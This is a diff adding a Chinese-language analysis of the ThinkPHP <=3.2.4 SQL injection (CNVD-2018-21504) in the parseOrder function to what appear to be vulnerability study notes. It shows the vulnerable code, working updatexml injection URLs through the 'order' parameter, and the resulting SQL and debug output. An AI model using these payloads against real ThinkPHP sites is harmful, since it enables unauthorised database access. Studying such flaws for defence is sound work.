@@ -601,3 +601,128 @@ $var['type']="456";
 	index.php?s=a/b/c/d/e/${code}
 	 
 	也可采用 index.php/a/b/c/${code}一下形式。
+
+二、ThinkPHP <=3.2.4 SQL注入漏洞（CNVD-2018-21504）
+
+原因：
+
+ThinkPHP 3.2.4版本中的Library/Think/Db/Driver.class.php文件的‘parseOrder’函数存在SQL注入漏洞，该漏洞源于程序错误地处理了变量key。远程攻击者可借助‘order’参数利用该漏洞执行任意的SQL命令。
+
+分析：
+
+在ThinkPHP <=3.2.4时，如果使用了order 查询
+
+```
+public function orderbySql()
+{
+    $user = M('user'); // 实例化 user 表对应的模型
+    $data = array();
+    $data['username'] = array('eq', 'admin'); // 查询条件：username = 'admin'
+    $order = I('get.order');  // 获取 GET 参数中的 'order' 值
+    $m = $user->where($data)->order($order)->find(); // 执行查询
+} 
+```
+
+在Library/Think/Db/Driver.class.php文件的‘parseOrder’函数存在SQL注入漏洞
+
+```
+	protected function parseOrder($order)
+	{
+		echo "<pre>";
+		echo "输入参数:\n";
+		var_dump($order);
+
+		if (is_array($order)) {
+			$array = array();
+			foreach ($order as $key => $val) {
+				echo "处理键："; var_dump($key);
+				echo "处理值："; var_dump($val);
+				
+				if (is_numeric($key)) {
+					$parsed = $this->parseKey($val);
+					echo "解析字段：" . $parsed . "\n";
+					$array[] = $parsed;
+				} else {
+					$parsed = $this->parseKey($key);
+					echo "解析字段：$parsed $val\n";
+					$array[] = $parsed . ' ' . $val;
+				}
+			}
+			$order = implode(',', $array);
+			echo "最终拼接："; var_dump($order);
+		}
+
+		echo "</pre>";
+		return !empty($order) ? ' ORDER BY ' . $order : '';
+	}
+```
+
+```
+    protected function parseKey(&$key)
+    {
+        $key = trim($key);
+        if (!is_numeric($key) && !preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
+            $key = '`' . $key . '`';
+        }
+        return $key;
+    }
+```
+
+
+
+如果URL如下：
+
+```
+index.php/Home/Index/orderbySql?order[updatexml(1,concat(0x3a,user()),1)]=
+或者
+index.php/Home/Index/orderbySql?order[]=updatexml(1,concat(0x3a,user()),1)
+```
+
+SQL语句为:
+
+```
+SELECT * FROM `think_user` ORDER BY `updatexml(1,concat(0x3a,user()),1)`  LIMIT 1
+```
+
+```
+SELECT * FROM `think_user` ORDER BY updatexml(1,concat(0x3a,user()),1)  LIMIT 1
+
+```
+
+```
+调试输出结果如下
+index.php/Home/Index/orderbySql?order[]=updatexml(1,concat(0x3a,user()),1)
+输入参数:
+array(1) {
+  [0]=>
+  string(34) "updatexml(1,concat(0x3a,user()),1)"
+}
+处理键：int(0)
+处理值：string(34) "updatexml(1,concat(0x3a,user()),1)"
+解析字段：updatexml(1,concat(0x3a,user()),1)
+最终拼接：string(34) "updatexml(1,concat(0x3a,user()),1)"
+
+index.php/Home/Index/orderbySql?order[updatexml(1,concat(0x3a,user()),1)]=
+输入参数:
+array(1) {
+  ["updatexml(1,concat(0x3a,user()),1)"]=>
+  string(0) ""
+}
+处理键：string(34) "updatexml(1,concat(0x3a,user()),1)"
+处理值：string(0) ""
+解析字段：updatexml(1,concat(0x3a,user()),1) 
+最终拼接：string(35) "updatexml(1,concat(0x3a,user()),1) "
+
+http://localhost/thinkphp-3.2.3/index.php/Home/Index/orderbySql?order[account]=
+输入参数:
+array(1) {
+  ["account"]=>
+  string(0) ""
+}
+处理键：string(7) "account"
+处理值：string(0) ""
+解析字段：`account` 
+最终拼接：string(10) "`account` "
+执行的SQL语句：
+SELECT * FROM `think_user` ORDER BY `account`  LIMIT 1  
+```
